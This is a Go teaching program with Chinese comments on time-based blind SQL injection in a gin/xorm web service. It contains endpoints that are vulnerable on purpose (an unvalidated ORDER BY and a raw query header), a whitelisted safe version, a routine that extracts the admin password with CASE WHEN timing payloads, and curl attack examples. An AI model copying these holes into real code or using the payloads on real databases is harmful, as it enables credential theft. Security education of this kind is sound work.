package main

import (
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	_ "github.com/mattn/go-sqlite3"
	"xorm.io/xorm"
)

// Product 产品模型
type Product struct {
	ID          int64     `xorm:"pk autoincr"`
	Name        string    `xorm:"not null"`
	Description string    `xorm:"text"`
	Price       float64   `xorm:"not null"`
	Stock       int       `xorm:"not null"`
	Category    string    `xorm:"not null index"`
	Created     time.Time `xorm:"created"`
}

// AdminUser 管理员用户模型
type AdminUser struct {
	ID       int64  `xorm:"pk autoincr"`
	Username string `xorm:"unique not null"`
	Password string `xorm:"not null"` // 实际应用中应该存储哈希值
	Role     string `xorm:"not null"`
}

// TimeBasedBlindInjection 时间盲注漏洞演示
type TimeBasedBlindInjection struct {
	engine *xorm.Engine
}

// VulnerableProductSearch 存在时间盲注漏洞的搜索功能
func (t *TimeBasedBlindInjection) VulnerableProductSearch(c *gin.Context) {
	category := c.Query("category")
	sortBy := c.Query("sort") // 漏洞点：未验证的排序字段
	
	if category == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "category is required"})
		return
	}
	
	// 构建查询
	query := fmt.Sprintf("SELECT * FROM product WHERE category = '%s'", category)
	
	// 漏洞：直接拼接排序字段，可能导致SQL注入
	if sortBy != "" {
		query += fmt.Sprintf(" ORDER BY %s", sortBy)
	}
	
	start := time.Now()
	
	var products []Product
	err := t.engine.SQL(query).Find(&products)
	
	elapsed := time.Since(start)
	
	if err != nil {
		// 错误信息可能泄露数据库信息
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": fmt.Sprintf("Database error: %v", err),
			"query_time": elapsed.Seconds(),
		})
		return
	}
	
	c.JSON(http.StatusOK, gin.H{
		"products": products,
		"count": len(products),
		"query_time": elapsed.Seconds(), // 泄露查询时间，可用于时间盲注
	})
}

// VulnerableStatsAPI 另一个时间盲注漏洞示例
func (t *TimeBasedBlindInjection) VulnerableStatsAPI(c *gin.Context) {
	// 从请求头获取统计类型（假设这是内部API）
	statsType := c.GetHeader("X-Stats-Type")
	
	var result interface{}
	var query string
	
	switch statsType {
	case "products":
		query = "SELECT COUNT(*) as count FROM product"
	case "categories":
		query = "SELECT category, COUNT(*) as count FROM product GROUP BY category"
	default:
		// 漏洞：直接使用用户输入构建查询
		customQuery := c.GetHeader("X-Custom-Query")
		if customQuery != "" {
			query = fmt.Sprintf("SELECT %s FROM product", customQuery)
		} else {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid stats type"})
			return
		}
	}
	
	start := time.Now()
	
	results, err := t.engine.Query(query)
	
	elapsed := time.Since(start)
	
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": "query failed",
			"time": elapsed.Seconds(),
		})
		return
	}
	
	c.JSON(http.StatusOK, gin.H{
		"results": results,
		"query_time": elapsed.Seconds(),
	})
}

// SafeProductSearch 安全的产品搜索实现
func (t *TimeBasedBlindInjection) SafeProductSearch(c *gin.Context) {
	category := c.Query("category")
	sortBy := c.Query("sort")
	
	if category == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "category is required"})
		return
	}
	
	// 白名单验证排序字段
	allowedSortFields := map[string]bool{
		"name": true,
		"price": true,
		"created": true,
		"stock": true,
	}
	
	query := t.engine.Where("category = ?", category)
	
	if sortBy != "" && allowedSortFields[sortBy] {
		query = query.OrderBy(sortBy)
	}
	
	var products []Product
	err := query.Find(&products)
	
	if err != nil {
		// 不泄露详细错误信息
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": "An error occurred while processing your request",
		})
		return
	}
	
	// 不返回查询时间，避免时间攻击
	c.JSON(http.StatusOK, gin.H{
		"products": products,
		"count": len(products),
	})
}

// DemonstrateTimeBasedBlindInjection 演示时间盲注攻击
func (t *TimeBasedBlindInjection) DemonstrateTimeBasedBlindInjection() {
	fmt.Println("\n=== 时间盲注攻击演示 ===")
	
	// 模拟攻击者尝试猜测管理员密码长度
	fmt.Println("\n1. 尝试猜测管理员密码长度：")
	
	for i := 1; i <= 10; i++ {
		// 构造时间盲注payload
		// 如果密码长度等于i，则延迟2秒
		payload := fmt.Sprintf("price, (CASE WHEN (SELECT LENGTH(password) FROM admin_user WHERE username='admin')=%d THEN (SELECT COUNT(*) FROM product p1, product p2) ELSE price END)", i)
		
		start := time.Now()
		
		query := fmt.Sprintf("SELECT * FROM product WHERE category = 'electronics' ORDER BY %s", payload)
		var products []Product
		err := t.engine.SQL(query).Find(&products)
		
		elapsed := time.Since(start)
		
		if err != nil {
			fmt.Printf("长度 %d: 查询出错\n", i)
		} else {
			fmt.Printf("长度 %d: 查询时间 %.2f 秒", i, elapsed.Seconds())
			if elapsed.Seconds() > 1.0 {
				fmt.Printf(" <- 可能是正确的密码长度!")
			}
			fmt.Println()
		}
	}
	
	fmt.Println("\n2. 尝试猜测密码的第一个字符：")
	
	// 模拟猜测密码的第一个字符
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
	for _, char := range chars {
		// 如果第一个字符匹配，则延迟
		payload := fmt.Sprintf("price, (CASE WHEN (SELECT SUBSTR(password,1,1) FROM admin_user WHERE username='admin')='%c' THEN (SELECT COUNT(*) FROM product p1, product p2) ELSE price END)", char)
		
		start := time.Now()
		
		query := fmt.Sprintf("SELECT * FROM product WHERE category = 'electronics' ORDER BY %s LIMIT 1", payload)
		var products []Product
		err := t.engine.SQL(query).Find(&products)
		
		elapsed := time.Since(start)
		
		if err == nil && elapsed.Seconds() > 0.5 {
			fmt.Printf("字符 '%c': 查询时间 %.2f 秒 <- 可能是密码的第一个字符!\n", char, elapsed.Seconds())
			break
		}
	}
}

// InitDatabaseWithData 初始化数据库并插入测试数据
func InitDatabaseWithData() (*xorm.Engine, error) {
	engine, err := xorm.NewEngine("sqlite3", "./timeblind.db")
	if err != nil {
		return nil, err
	}
	
	// 创建表
	err = engine.Sync2(new(Product), new(AdminUser))
	if err != nil {
		return nil, err
	}
	
	// 插入测试数据
	products := []Product{
		{Name: "Laptop", Description: "High-end laptop", Price: 999.99, Stock: 10, Category: "electronics"},
		{Name: "Mouse", Description: "Wireless mouse", Price: 29.99, Stock: 50, Category: "electronics"},
		{Name: "Keyboard", Description: "Mechanical keyboard", Price: 89.99, Stock: 30, Category: "electronics"},
		{Name: "Monitor", Description: "4K Monitor", Price: 399.99, Stock: 15, Category: "electronics"},
		{Name: "Desk", Description: "Standing desk", Price: 299.99, Stock: 20, Category: "furniture"},
		{Name: "Chair", Description: "Ergonomic chair", Price: 199.99, Stock: 25, Category: "furniture"},
	}
	
	for _, product := range products {
		_, err = engine.Insert(&product)
		if err != nil {
			return nil, err
		}
	}
	
	// 插入管理员账户
	admin := &AdminUser{
		Username: "admin",
		Password: "secret123", // 实际应用中应该是哈希值
		Role:     "admin",
	}
	_, err = engine.Insert(admin)
	if err != nil {
		return nil, err
	}
	
	// 创建大量数据用于时间延迟
	for i := 0; i < 1000; i++ {
		p := Product{
			Name:     fmt.Sprintf("Product%d", i),
			Description: "Bulk product",
			Price:    float64(i),
			Stock:    100,
			Category: "bulk",
		}
		engine.Insert(&p)
	}
	
	return engine, nil
}

func main() {
	fmt.Println("=== XORM时间盲注漏洞演示 ===\n")
	
	// 初始化数据库
	engine, err := InitDatabaseWithData()
	if err != nil {
		log.Fatal("数据库初始化失败:", err)
	}
	defer engine.Close()
	
	tbi := &TimeBasedBlindInjection{engine: engine}
	
	// 设置Gin路由
	r := gin.Default()
	
	// 漏洞路由
	r.GET("/api/vulnerable/products", tbi.VulnerableProductSearch)
	r.GET("/api/vulnerable/stats", tbi.VulnerableStatsAPI)
	
	// 安全路由
	r.GET("/api/safe/products", tbi.SafeProductSearch)
	
	// 启动服务器
	go func() {
		fmt.Println("服务器运行在 http://localhost:8084")
		r.Run(":8084")
	}()
	
	// 等待服务器启动
	time.Sleep(2 * time.Second)
	
	// 演示攻击
	tbi.DemonstrateTimeBasedBlindInjection()
	
	fmt.Println("\n=== 漏洞说明 ===")
	fmt.Println("时间盲注是一种特殊的SQL注入技术：")
	fmt.Println("1. 攻击者无法直接看到查询结果")
	fmt.Println("2. 通过构造特殊的SQL语句，使查询在特定条件下延迟")
	fmt.Println("3. 根据响应时间的差异来推断数据")
	fmt.Println("\n防御措施：")
	fmt.Println("1. 使用参数化查询")
	fmt.Println("2. 严格验证输入，使用白名单")
	fmt.Println("3. 不要返回详细的错误信息和查询时间")
	fmt.Println("4. 实施查询超时限制")
	fmt.Println("5. 监控异常的查询模式")
	
	fmt.Println("\n测试命令：")
	fmt.Println("1. 正常查询：")
	fmt.Println("   curl 'http://localhost:8084/api/vulnerable/products?category=electronics&sort=price'")
	fmt.Println("\n2. 时间盲注攻击（会导致延迟）：")
	fmt.Println("   curl 'http://localhost:8084/api/vulnerable/products?category=electronics&sort=price,(CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM product p1,product p2) ELSE price END)'")
	
	// 保持程序运行
	select {}
}